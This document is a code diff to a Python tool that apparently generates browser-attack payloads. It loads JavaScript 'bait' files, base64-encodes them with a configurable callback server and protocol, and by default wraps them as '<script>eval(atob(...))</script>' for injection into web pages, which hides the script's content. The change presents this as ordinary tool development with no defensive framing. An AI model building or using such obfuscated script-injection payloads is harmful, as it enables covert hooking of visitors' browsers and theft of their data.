@@ -7,6 +7,9 @@ BAITS_PATH = "baits"
 
 # Config consts
 LAN_SERVER_ADDRESS_CONFIG = "127.0.0.1:5000"
+HTTP_PROTOCOL = "http"
+PREPARED_FORMAT = 'prepared'
+B64_FORMAT = 'b64'
 
 class Parser:
     @classmethod
@@ -28,12 +31,22 @@ class Bait(Enum):
     FETCH = "fetch.js"
 
     @classmethod
-    def b64_encode(cls, bait: str, server_address = LAN_SERVER_ADDRESS_CONFIG):
-        return Parser.b64_encode(
-            f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}", 
-            server_address=server_address
-            )
+    def b64_encode(cls, bait: str, **kwargs):
+        server = kwargs.get('--server') or LAN_SERVER_ADDRESS_CONFIG
+        protocol = kwargs.get('--protocol') or HTTP_PROTOCOL
+        format = kwargs.get('--format') or PREPARED_FORMAT
 
+        encoded_bait =  Parser.b64_encode(
+            f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}", 
+            server=server,
+            protocol=protocol
+            )
+        
+        if format == B64_FORMAT:
+            return encoded_bait
+        
+        if format == PREPARED_FORMAT:
+            return f"<script>eval(atob(\'{encoded_bait}\'));</script>"
 
 class Module(Enum):
     BROWSER_PLUGINS = 'browser_plugins.js'
